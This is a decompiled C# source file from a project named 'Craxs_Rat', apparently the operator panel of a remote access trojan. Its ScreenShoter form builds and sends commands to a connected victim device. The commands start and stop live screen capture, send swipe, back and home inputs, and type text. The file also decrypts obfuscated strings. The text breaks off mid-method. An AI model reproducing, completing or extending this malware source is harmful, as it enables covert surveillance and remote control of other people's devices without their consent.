using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml;
using Accord.Video.FFMPEG;
using Craxs_Rat.My;
using DrakeUI.Framework;
using MetroSet_UI.Controls;
using MetroSet_UI.Enums;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat
{
	// Token: 0x020000C8 RID: 200
	[DesignerGenerated]
	public partial class ScreenShoter : Form
	{
		// Token: 0x06000EBC RID: 3772 RVA: 0x0009B470 File Offset: 0x00099670
		public ScreenShoter()
		{
			base.Load += this.ScreenShoter_Load;
			base.FormClosing += this.ScreenShoter_FormClosing;
			base.KeyDown += this.ScreenShoter_KeyDown;
			base.KeyUp += this.ScreenShoter_KeyUp;
			this.int_0 = 25;
			this.bool_1 = false;
			this.int_1 = 0;
			this.string_1 = "null";
			this.bool_2 = false;
			this.strings_0 = new string[]
			{
				"Auto",
				"2560x1600",
				"2048x1536",
				"1920x1200",
				"1920x1152",
				"1920x1080",
				"1600x1200",
				"1600x900",
				"1440x904",
				"1366x768",
				"1360x768",
				"1280x960",
				"1280x800",
				"1280x768",
				"1280x720",
				"1279x720",
				"1152x720",
				"1080x607",
				"1024x960",
				"1024x770",
				"1024x768",
				"1024x600",
				"960x640",
				"960x600",
				"960x540",
				"864x480",
				"854x480",
				"800x600",
				"800x480",
				"768x576",
				"640x480",
				"640x360",
				"480x320",
				"432x240",
				"400x240",
				"320x240",
				"280x280"
			};
			this.bool_3 = false;
			this.int_2 = 0;
			this.bool_4 = false;
			this.bool_5 = false;
			this.int_3 = 0;
			this.object_1 = false;
			this.object_2 = false;
			this.InitializeComponent();
		}

		// Token: 0x1700045A RID: 1114
		// (get) Token: 0x06000EBF RID: 3775 RVA: 0x00006C0C File Offset: 0x00004E0C
		// (set) Token: 0x06000EC0 RID: 3776 RVA: 0x0009DE30 File Offset: 0x0009C030
		internal virtual PictureBox Livepicbox
		{
			[CompilerGenerated]
			get
			{
				return this._Livepicbox;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.Livepicbox_MouseDown);
				MouseEventHandler value3 = new MouseEventHandler(this.Livepicbox_MouseUp);
				MouseEventHandler value4 = new MouseEventHandler(this.Livepicbox_MouseMove);
				PictureBox livepicbox = this._Livepicbox;
				if (livepicbox != null)
				{
					livepicbox.MouseDown -= value2;
					livepicbox.MouseUp -= value3;
					livepicbox.MouseMove -= value4;
				}
				this._Livepicbox = value;
				livepicbox = this._Livepicbox;
				if (livepicbox != null)
				{
					livepicbox.MouseDown += value2;
					livepicbox.MouseUp += value3;
					livepicbox.MouseMove += value4;
				}
			}
		}

		// Token: 0x1700045B RID: 1115
		// (get) Token: 0x06000EC1 RID: 3777 RVA: 0x00006C14 File Offset: 0x00004E14
		// (set) Token: 0x06000EC2 RID: 3778 RVA: 0x0009DEAC File Offset: 0x0009C0AC
		internal virtual Button StopButton
		{
			[CompilerGenerated]
			get
			{
				return this._StopButton;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.StopButton_Click);
				Button stopButton = this._StopButton;
				if (stopButton != null)
				{
					stopButton.Click -= value2;
				}
				this._StopButton = value;
				stopButton = this._StopButton;
				if (stopButton != null)
				{
					stopButton.Click += value2;
				}
			}
		}

		// Token: 0x1700045C RID: 1116
		// (get) Token: 0x06000EC3 RID: 3779 RVA: 0x00006C1C File Offset: 0x00004E1C
		// (set) Token: 0x06000EC4 RID: 3780 RVA: 0x0009DEF0 File Offset: 0x0009C0F0
		internal virtual Button StartButton
		{
			[CompilerGenerated]
			get
			{
				return this._StartButton;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.StartButton_Click);
				Button startButton = this._StartButton;
				if (startButton != null)
				{
					startButton.Click -= value2;
				}
				this._StartButton = value;
				startButton = this._StartButton;
				if (startButton != null)
				{
					startButton.Click += value2;
				}
			}
		}

		// Token: 0x1700045D RID: 1117
		// (get) Token: 0x06000EC5 RID: 3781 RVA: 0x00006C24 File Offset: 0x00004E24
		// (set) Token: 0x06000EC6 RID: 3782 RVA: 0x0009DF34 File Offset: 0x0009C134
		internal virtual Label Label1 { get; set; }

		// Token: 0x1700045E RID: 1118
		// (get) Token: 0x06000EC7 RID: 3783 RVA: 0x00006C2C File Offset: 0x00004E2C
		// (set) Token: 0x06000EC8 RID: 3784 RVA: 0x0009DF48 File Offset: 0x0009C148
		internal virtual Label Label2 { get; set; }

		// Token: 0x1700045F RID: 1119
		// (get) Token: 0x06000EC9 RID: 3785 RVA: 0x00006C34 File Offset: 0x00004E34
		// (set) Token: 0x06000ECA RID: 3786 RVA: 0x0009DF5C File Offset: 0x0009C15C
		internal virtual Panel vewpnl { get; set; }

		// Token: 0x17000460 RID: 1120
		// (get) Token: 0x06000ECB RID: 3787 RVA: 0x00006C3C File Offset: 0x00004E3C
		// (set) Token: 0x06000ECC RID: 3788 RVA: 0x0009DF70 File Offset: 0x0009C170
		internal virtual Button Button7
		{
			[CompilerGenerated]
			get
			{
				return this._Button7;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Button7_Click);
				Button button = this._Button7;
				if (button != null)
				{
					button.Click -= value2;
				}
				this._Button7 = value;
				button = this._Button7;
				if (button != null)
				{
					button.Click += value2;
				}
			}
		}

		// Token: 0x17000461 RID: 1121
		// (get) Token: 0x06000ECD RID: 3789 RVA: 0x00006C44 File Offset: 0x00004E44
		// (set) Token: 0x06000ECE RID: 3790 RVA: 0x0009DFB4 File Offset: 0x0009C1B4
		internal virtual Button Button6
		{
			[CompilerGenerated]
			get
			{
				return this._Button6;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Button6_Click);
				Button button = this._Button6;
				if (button != null)
				{
					button.Click -= value2;
				}
				this._Button6 = value;
				button = this._Button6;
				if (button != null)
				{
					button.Click += value2;
				}
			}
		}

		// Token: 0x17000462 RID: 1122
		// (get) Token: 0x06000ECF RID: 3791 RVA: 0x00006C4C File Offset: 0x00004E4C
		// (set) Token: 0x06000ED0 RID: 3792 RVA: 0x0009DFF8 File Offset: 0x0009C1F8
		internal virtual Button Button5
		{
			[CompilerGenerated]
			get
			{
				return this._Button5;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Button5_Click);
				Button button = this._Button5;
				if (button != null)
				{
					button.Click -= value2;
				}
				this._Button5 = value;
				button = this._Button5;
				if (button != null)
				{
					button.Click += value2;
				}
			}
		}

		// Token: 0x17000463 RID: 1123
		// (get) Token: 0x06000ED1 RID: 3793 RVA: 0x00006C54 File Offset: 0x00004E54
		// (set) Token: 0x06000ED2 RID: 3794 RVA: 0x0009E03C File Offset: 0x0009C23C
		internal virtual Button Enterbutton
		{
			[CompilerGenerated]
			get
			{
				return this._Enterbutton;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Enterbutton_Click);
				Button enterbutton = this._Enterbutton;
				if (enterbutton != null)
				{
					enterbutton.Click -= value2;
				}
				this._Enterbutton = value;
				enterbutton = this._Enterbutton;
				if (enterbutton != null)
				{
					enterbutton.Click += value2;
				}
			}
		}

		// Token: 0x17000464 RID: 1124
		// (get) Token: 0x06000ED3 RID: 3795 RVA: 0x00006C5C File Offset: 0x00004E5C
		// (set) Token: 0x06000ED4 RID: 3796 RVA: 0x0009E080 File Offset: 0x0009C280
		internal virtual TextBox textsend { get; set; }

		// Token: 0x17000465 RID: 1125
		// (get) Token: 0x06000ED5 RID: 3797 RVA: 0x00006C64 File Offset: 0x00004E64
		// (set) Token: 0x06000ED6 RID: 3798 RVA: 0x0009E094 File Offset: 0x0009C294
		internal virtual DrakeUICheckBox Save
		{
			[CompilerGenerated]
			get
			{
				return this._Save;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.Save_MouseClick);
				DrakeUICheckBox save = this._Save;
				if (save != null)
				{
					save.MouseClick -= value2;
				}
				this._Save = value;
				save = this._Save;
				if (save != null)
				{
					save.MouseClick += value2;
				}
			}
		}

		// Token: 0x17000466 RID: 1126
		// (get) Token: 0x06000ED7 RID: 3799 RVA: 0x00006C6C File Offset: 0x00004E6C
		// (set) Token: 0x06000ED8 RID: 3800 RVA: 0x0009E0D8 File Offset: 0x0009C2D8
		internal virtual Panel Panel1 { get; set; }

		// Token: 0x17000467 RID: 1127
		// (get) Token: 0x06000ED9 RID: 3801 RVA: 0x00006C74 File Offset: 0x00004E74
		// (set) Token: 0x06000EDA RID: 3802 RVA: 0x0009E0EC File Offset: 0x0009C2EC
		internal virtual Panel Panel2
		{
			[CompilerGenerated]
			get
			{
				return this._Panel2;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.Panel2_MouseDown);
				Panel panel = this._Panel2;
				if (panel != null)
				{
					panel.MouseDown -= value2;
				}
				this._Panel2 = value;
				panel = this._Panel2;
				if (panel != null)
				{
					panel.MouseDown += value2;
				}
			}
		}

		// Token: 0x17000468 RID: 1128
		// (get) Token: 0x06000EDB RID: 3803 RVA: 0x00006C7C File Offset: 0x00004E7C
		// (set) Token: 0x06000EDC RID: 3804 RVA: 0x0009E130 File Offset: 0x0009C330
		internal virtual Panel Panel3
		{
			[CompilerGenerated]
			get
			{
				return this._Panel3;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.Panel3_MouseDown);
				Panel panel = this._Panel3;
				if (panel != null)
				{
					panel.MouseDown -= value2;
				}
				this._Panel3 = value;
				panel = this._Panel3;
				if (panel != null)
				{
					panel.MouseDown += value2;
				}
			}
		}

		// Token: 0x17000469 RID: 1129
		// (get) Token: 0x06000EDD RID: 3805 RVA: 0x00006C84 File Offset: 0x00004E84
		// (set) Token: 0x06000EDE RID: 3806 RVA: 0x0009E174 File Offset: 0x0009C374
		internal virtual Panel Panel4
		{
			[CompilerGenerated]
			get
			{
				return this._Panel4;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.Panel4_MouseDown);
				Panel panel = this._Panel4;
				if (panel != null)
				{
					panel.MouseDown -= value2;
				}
				this._Panel4 = value;
				panel = this._Panel4;
				if (panel != null)
				{
					panel.MouseDown += value2;
				}
			}
		}

		// Token: 0x1700046A RID: 1130
		// (get) Token: 0x06000EDF RID: 3807 RVA: 0x00006C8C File Offset: 0x00004E8C
		// (set) Token: 0x06000EE0 RID: 3808 RVA: 0x0009E1B8 File Offset: 0x0009C3B8
		internal virtual Panel Panel5 { get; set; }

		// Token: 0x1700046B RID: 1131
		// (get) Token: 0x06000EE1 RID: 3809 RVA: 0x00006C94 File Offset: 0x00004E94
		// (set) Token: 0x06000EE2 RID: 3810 RVA: 0x0009E1CC File Offset: 0x0009C3CC
		internal virtual Button Button1
		{
			[CompilerGenerated]
			get
			{
				return this._Button1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				Button button = this._Button1;
				if (button != null)
				{
					button.Click -= value2;
				}
				this._Button1 = value;
				button = this._Button1;
				if (button != null)
				{
					button.Click += value2;
				}
			}
		}

		// Token: 0x1700046C RID: 1132
		// (get) Token: 0x06000EE3 RID: 3811 RVA: 0x00006C9C File Offset: 0x00004E9C
		// (set) Token: 0x06000EE4 RID: 3812 RVA: 0x0009E210 File Offset: 0x0009C410
		internal virtual Panel Panel6 { get; set; }

		// Token: 0x1700046D RID: 1133
		// (get) Token: 0x06000EE5 RID: 3813 RVA: 0x00006CA4 File Offset: 0x00004EA4
		// (set) Token: 0x06000EE6 RID: 3814 RVA: 0x0009E224 File Offset: 0x0009C424
		internal virtual Panel Panel7 { get; set; }

		// Token: 0x17000480 RID: 1152
		// (get) Token: 0x06000EE7 RID: 3815 RVA: 0x00006CAC File Offset: 0x00004EAC
		// (set) Token: 0x06000EE8 RID: 3816 RVA: 0x0009E238 File Offset: 0x0009C438
		internal virtual DrakeUIToolTip DrakeUIToolTip1 { get; set; }

		// Token: 0x1700046E RID: 1134
		// (get) Token: 0x06000EE9 RID: 3817 RVA: 0x00006CB4 File Offset: 0x00004EB4
		// (set) Token: 0x06000EEA RID: 3818 RVA: 0x0009E24C File Offset: 0x0009C44C
		internal virtual PictureBox PictureBox2 { get; set; }

		// Token: 0x1700046F RID: 1135
		// (get) Token: 0x06000EEB RID: 3819 RVA: 0x00006CBC File Offset: 0x00004EBC
		// (set) Token: 0x06000EEC RID: 3820 RVA: 0x0009E260 File Offset: 0x0009C460
		internal virtual PictureBox PictureBox3 { get; set; }

		// Token: 0x17000470 RID: 1136
		// (get) Token: 0x06000EED RID: 3821 RVA: 0x00006CC4 File Offset: 0x00004EC4
		// (set) Token: 0x06000EEE RID: 3822 RVA: 0x0009E274 File Offset: 0x0009C474
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				System.Windows.Forms.Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x17000471 RID: 1137
		// (get) Token: 0x06000EEF RID: 3823 RVA: 0x00006CCC File Offset: 0x00004ECC
		// (set) Token: 0x06000EF0 RID: 3824 RVA: 0x0009E2B8 File Offset: 0x0009C4B8
		internal virtual Label Label4 { get; set; }

		// Token: 0x17000472 RID: 1138
		// (get) Token: 0x06000EF1 RID: 3825 RVA: 0x00006CD4 File Offset: 0x00004ED4
		// (set) Token: 0x06000EF2 RID: 3826 RVA: 0x0009E2CC File Offset: 0x0009C4CC
		internal virtual Label Label5 { get; set; }

		// Token: 0x17000473 RID: 1139
		// (get) Token: 0x06000EF3 RID: 3827 RVA: 0x00006CDC File Offset: 0x00004EDC
		// (set) Token: 0x06000EF4 RID: 3828 RVA: 0x0009E2E0 File Offset: 0x0009C4E0
		internal virtual MetroSetProgressBar PBS { get; set; }

		// Token: 0x17000481 RID: 1153
		// (get) Token: 0x06000EF5 RID: 3829 RVA: 0x00006CE4 File Offset: 0x00004EE4
		// (set) Token: 0x06000EF6 RID: 3830 RVA: 0x0009E2F4 File Offset: 0x0009C4F4
		internal virtual System.Windows.Forms.Timer refreshtimer
		{
			[CompilerGenerated]
			get
			{
				return this._refreshtimer;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.refreshtimer_Tick);
				System.Windows.Forms.Timer refreshtimer = this._refreshtimer;
				if (refreshtimer != null)
				{
					refreshtimer.Tick -= value2;
				}
				this._refreshtimer = value;
				refreshtimer = this._refreshtimer;
				if (refreshtimer != null)
				{
					refreshtimer.Tick += value2;
				}
			}
		}

		// Token: 0x17000474 RID: 1140
		// (get) Token: 0x06000EF7 RID: 3831 RVA: 0x00006CEC File Offset: 0x00004EEC
		// (set) Token: 0x06000EF8 RID: 3832 RVA: 0x0009E338 File Offset: 0x0009C538
		internal virtual Label Label7 { get; set; }

		// Token: 0x17000475 RID: 1141
		// (get) Token: 0x06000EF9 RID: 3833 RVA: 0x00006CF4 File Offset: 0x00004EF4
		// (set) Token: 0x06000EFA RID: 3834 RVA: 0x0009E34C File Offset: 0x0009C54C
		internal virtual Label Label6 { get; set; }

		// Token: 0x17000476 RID: 1142
		// (get) Token: 0x06000EFB RID: 3835 RVA: 0x00006CFC File Offset: 0x00004EFC
		// (set) Token: 0x06000EFC RID: 3836 RVA: 0x0009E360 File Offset: 0x0009C560
		internal virtual DrakeUIComboBox combosize { get; set; }

		// Token: 0x17000477 RID: 1143
		// (get) Token: 0x06000EFD RID: 3837 RVA: 0x00006D04 File Offset: 0x00004F04
		// (set) Token: 0x06000EFE RID: 3838 RVA: 0x0009E374 File Offset: 0x0009C574
		internal virtual Panel Panel8 { get; set; }

		// Token: 0x17000478 RID: 1144
		// (get) Token: 0x06000EFF RID: 3839 RVA: 0x00006D0C File Offset: 0x00004F0C
		// (set) Token: 0x06000F00 RID: 3840 RVA: 0x0009E388 File Offset: 0x0009C588
		internal virtual Label toptitle { get; set; }

		// Token: 0x17000482 RID: 1154
		// (get) Token: 0x06000F01 RID: 3841 RVA: 0x00006D14 File Offset: 0x00004F14
		// (set) Token: 0x06000F02 RID: 3842 RVA: 0x0009E39C File Offset: 0x0009C59C
		internal virtual System.Windows.Forms.Timer presstimer
		{
			[CompilerGenerated]
			get
			{
				return this._presstimer;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.presstimer_Tick);
				System.Windows.Forms.Timer presstimer = this._presstimer;
				if (presstimer != null)
				{
					presstimer.Tick -= value2;
				}
				this._presstimer = value;
				presstimer = this._presstimer;
				if (presstimer != null)
				{
					presstimer.Tick += value2;
				}
			}
		}

		// Token: 0x17000479 RID: 1145
		// (get) Token: 0x06000F03 RID: 3843 RVA: 0x00006D1C File Offset: 0x00004F1C
		// (set) Token: 0x06000F04 RID: 3844 RVA: 0x0009E3E0 File Offset: 0x0009C5E0
		internal virtual DrakeUIComboBox Qualtibox { get; set; }

		// Token: 0x1700047A RID: 1146
		// (get) Token: 0x06000F05 RID: 3845 RVA: 0x00006D24 File Offset: 0x00004F24
		// (set) Token: 0x06000F06 RID: 3846 RVA: 0x0009E3F4 File Offset: 0x0009C5F4
		internal virtual DrakeUIComboBox FPSBOX { get; set; }

		// Token: 0x1700047B RID: 1147
		// (get) Token: 0x06000F07 RID: 3847 RVA: 0x00006D2C File Offset: 0x00004F2C
		// (set) Token: 0x06000F08 RID: 3848 RVA: 0x0009E408 File Offset: 0x0009C608
		internal virtual DrakeUIAvatar DrakeUIAvatar1
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIAvatar1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIAvatar1_Click);
				DrakeUIAvatar drakeUIAvatar = this._DrakeUIAvatar1;
				if (drakeUIAvatar != null)
				{
					drakeUIAvatar.Click -= value2;
				}
				this._DrakeUIAvatar1 = value;
				drakeUIAvatar = this._DrakeUIAvatar1;
				if (drakeUIAvatar != null)
				{
					drakeUIAvatar.Click += value2;
				}
			}
		}

		// Token: 0x1700047C RID: 1148
		// (get) Token: 0x06000F09 RID: 3849 RVA: 0x00006D34 File Offset: 0x00004F34
		// (set) Token: 0x06000F0A RID: 3850 RVA: 0x0009E44C File Offset: 0x0009C64C
		internal virtual DrakeUIAvatar DrakeUIAvatar2
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIAvatar2;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIAvatar2_Click);
				DrakeUIAvatar drakeUIAvatar = this._DrakeUIAvatar2;
				if (drakeUIAvatar != null)
				{
					drakeUIAvatar.Click -= value2;
				}
				this._DrakeUIAvatar2 = value;
				drakeUIAvatar = this._DrakeUIAvatar2;
				if (drakeUIAvatar != null)
				{
					drakeUIAvatar.Click += value2;
				}
			}
		}

		// Token: 0x1700047D RID: 1149
		// (get) Token: 0x06000F0B RID: 3851 RVA: 0x00006D3C File Offset: 0x00004F3C
		// (set) Token: 0x06000F0C RID: 3852 RVA: 0x0009E490 File Offset: 0x0009C690
		internal virtual DrakeUIComboBox SKtype { get; set; }

		// Token: 0x1700047E RID: 1150
		// (get) Token: 0x06000F0D RID: 3853 RVA: 0x00006D44 File Offset: 0x00004F44
		// (set) Token: 0x06000F0E RID: 3854 RVA: 0x0009E4A4 File Offset: 0x0009C6A4
		public virtual DrakeUIAvatar Dismisbtn
		{
			[CompilerGenerated]
			get
			{
				return this._Dismisbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Dismisbtn_Click);
				DrakeUIAvatar dismisbtn = this._Dismisbtn;
				if (dismisbtn != null)
				{
					dismisbtn.Click -= value2;
				}
				this._Dismisbtn = value;
				dismisbtn = this._Dismisbtn;
				if (dismisbtn != null)
				{
					dismisbtn.Click += value2;
				}
			}
		}

		// Token: 0x1700047F RID: 1151
		// (get) Token: 0x06000F0F RID: 3855 RVA: 0x00006D4C File Offset: 0x00004F4C
		// (set) Token: 0x06000F10 RID: 3856 RVA: 0x0009E4E8 File Offset: 0x0009C6E8
		internal virtual DrakeUICheckBox checkblock
		{
			[CompilerGenerated]
			get
			{
				return this._checkblock;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.checkblock_MouseClick);
				DrakeUICheckBox checkblock = this._checkblock;
				if (checkblock != null)
				{
					checkblock.MouseClick -= value2;
				}
				this._checkblock = value;
				checkblock = this._checkblock;
				if (checkblock != null)
				{
					checkblock.MouseClick += value2;
				}
			}
		}

		// Token: 0x06000F11 RID: 3857 RVA: 0x0009E52C File Offset: 0x0009C72C
		private void StartButton_Click(object sender, EventArgs e)
		{
			if (this.gclass8_1 != null && !this.bool_0)
			{
				try
				{
					string[] array = this.gclass8_1.string_0.Split(new char[]
					{
						':'
					});
					object[] objects_ = new object[]
					{
						this.object_0,
						Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Module13.string_29 + GClass9.string_0, Module2.smethod_11("O4n+0N/9tZs/9grTszV3LQ==")), "on:"), this.Qualtibox.Text), "~"), this.FPSBOX.Text), "~"), this.gclass8_1.string_2), GClass9.string_0), array[0]), GClass9.string_0), array[1]), GClass9.string_0), Module13.string_5), GClass9.string_0), "0"), GClass9.string_0), Conversions.ToString(0)), GClass9.string_0), GClass9.string_3), GClass9.string_0), this.gclass8_1.string_2),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_1
					};
					this.gclass8_1.method_2(objects_);
					this.toptitle.Text = "Connecting , Please Wait...";
					this.StartButton.Enabled = false;
					this.StopButton.Enabled = true;
					this.vewpnl.Enabled = true;
					this.Livepicbox.Enabled = true;
					this.bool_0 = true;
					this.refreshtimer.Enabled = true;
					this.refreshtimer.Start();
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000F12 RID: 3858 RVA: 0x0009E734 File Offset: 0x0009C934
		private void StopButton_Click(object sender, EventArgs e)
		{
			if (this.gclass8_1 != null)
			{
				try
				{
					string[] array = this.gclass8_1.string_0.Split(new char[]
					{
						':'
					});
					object[] objects_ = new object[]
					{
						this.object_0,
						string.Concat(new string[]
						{
							Module13.string_29,
							GClass9.string_0,
							"sc:off",
							GClass9.string_0,
							array[0],
							GClass9.string_0,
							array[1],
							GClass9.string_0,
							Module13.string_5,
							GClass9.string_0,
							"0",
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							GClass9.string_3,
							GClass9.string_0,
							this.gclass8_1.string_2
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_1
					};
					this.toptitle.Text = "...";
					this.gclass8_1.method_2(objects_);
					this.StartButton.Enabled = true;
					this.StopButton.Enabled = false;
					this.toptitle.Text = Module2.smethod_60("A6zjTVCcL9LCPgi6BLl9OA==", "3216251749654813");
					this.vewpnl.Enabled = false;
					this.Livepicbox.Enabled = false;
					this.bool_0 = false;
					this.refreshtimer.Stop();
					this.PBS.Value = 0;
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000F13 RID: 3859 RVA: 0x0009E8EC File Offset: 0x0009CAEC
		private void ScreenShoter_Load(object sender, EventArgs e)
		{
			ScreenShoter.Class18 @class = new ScreenShoter.Class18(@class);
			@class.screenShoter_0 = this;
			this.combosize.Items.Clear();
			foreach (string item in this.strings_0)
			{
				this.combosize.Items.Add(item);
			}
			base.KeyPreview = true;
			base.Tag = "screen_" + this.gclass8_1.string_9;
			new Thread(new ThreadStart(@class.method_0))
			{
				IsBackground = true
			}.Start();
			this.toptitle.Text = Module2.smethod_60("A6zjTVCcL9LCPgi6BLl9OA==", "3216251749654813");
			this.combosize.Text = "Auto";
			this.PictureBox2.Image = (Image)this.gclass8_1.objects_1[0];
			this.PictureBox3.Image = this.gclass8_1.image_0;
			base.TransparencyKey = Color.FromArgb(45, 45, 45);
			this.BackColor = Color.FromArgb(45, 45, 45);
			this.Qualtibox.Text = MySettingsProperty.Settings.live_sc_qulty;
			this.FPSBOX.Text = "5";
		}

		// Token: 0x06000F14 RID: 3860 RVA: 0x0009EA2C File Offset: 0x0009CC2C
		private void method_2(object sender, EventArgs e)
		{
			if (this.gclass8_1 != null)
			{
				try
				{
					string[] array = this.gclass8_1.string_0.Split(new char[]
					{
						':'
					});
					object[] objects_ = new object[]
					{
						this.object_0,
						string.Concat(new string[]
						{
							Module13.string_29,
							GClass9.string_0,
							"sp<*>U",
							GClass9.string_0,
							array[0],
							GClass9.string_0,
							array[1],
							GClass9.string_0,
							Module13.string_5,
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							GClass9.string_3,
							GClass9.string_0,
							this.gclass8_1.string_2
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_1
					};
					this.gclass8_1.method_2(objects_);
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000F15 RID: 3861 RVA: 0x0009EB60 File Offset: 0x0009CD60
		private void method_3(object sender, EventArgs e)
		{
			if (this.gclass8_1 != null)
			{
				try
				{
					string[] array = this.gclass8_1.string_0.Split(new char[]
					{
						':'
					});
					object[] objects_ = new object[]
					{
						this.object_0,
						string.Concat(new string[]
						{
							Module13.string_29,
							GClass9.string_0,
							"sp<*>D",
							GClass9.string_0,
							array[0],
							GClass9.string_0,
							array[1],
							GClass9.string_0,
							Module13.string_5,
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							GClass9.string_3,
							GClass9.string_0,
							this.gclass8_1.string_2
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_1
					};
					this.gclass8_1.method_2(objects_);
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000F16 RID: 3862 RVA: 0x0009EC94 File Offset: 0x0009CE94
		private void method_4(object sender, EventArgs e)
		{
			if (this.gclass8_1 != null)
			{
				try
				{
					string[] array = this.gclass8_1.string_0.Split(new char[]
					{
						':'
					});
					object[] objects_ = new object[]
					{
						this.object_0,
						string.Concat(new string[]
						{
							Module13.string_29,
							GClass9.string_0,
							"sp<*>L",
							GClass9.string_0,
							array[0],
							GClass9.string_0,
							array[1],
							GClass9.string_0,
							Module13.string_5,
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							GClass9.string_3,
							GClass9.string_0,
							this.gclass8_1.string_2
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_1
					};
					this.gclass8_1.method_2(objects_);
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000F17 RID: 3863 RVA: 0x0009EDC8 File Offset: 0x0009CFC8
		private void method_5(object sender, EventArgs e)
		{
			if (this.gclass8_1 != null)
			{
				try
				{
					string[] array = this.gclass8_1.string_0.Split(new char[]
					{
						':'
					});
					object[] objects_ = new object[]
					{
						this.object_0,
						string.Concat(new string[]
						{
							Module13.string_29,
							GClass9.string_0,
							"sp<*>R",
							GClass9.string_0,
							array[0],
							GClass9.string_0,
							array[1],
							GClass9.string_0,
							Module13.string_5,
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							GClass9.string_3,
							GClass9.string_0,
							this.gclass8_1.string_2
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_1
					};
					this.gclass8_1.method_2(objects_);
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000F18 RID: 3864 RVA: 0x0009EF00 File Offset: 0x0009D100
		private void Button5_Click(object sender, EventArgs e)
		{
			if (this.gclass8_1 != null)
			{
				try
				{
					string[] array = this.gclass8_1.string_0.Split(new char[]
					{
						':'
					});
					object[] objects_ = new object[]
					{
						this.object_0,
						string.Concat(new string[]
						{
							Module13.string_29,
							GClass9.string_0,
							"sp<*>Bc",
							GClass9.string_0,
							array[0],
							GClass9.string_0,
							array[1],
							GClass9.string_0,
							Module13.string_5,
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							GClass9.string_3,
							GClass9.string_0,
							this.gclass8_1.string_2
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_1
					};
					this.gclass8_1.method_2(objects_);
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000F19 RID: 3865 RVA: 0x0009F038 File Offset: 0x0009D238
		private void Button6_Click(object sender, EventArgs e)
		{
			if (this.gclass8_1 != null)
			{
				try
				{
					string[] array = this.gclass8_1.string_0.Split(new char[]
					{
						':'
					});
					object[] objects_ = new object[]
					{
						this.object_0,
						string.Concat(new string[]
						{
							Module13.string_29,
							GClass9.string_0,
							"sp<*>Ho",
							GClass9.string_0,
							array[0],
							GClass9.string_0,
							array[1],
							GClass9.string_0,
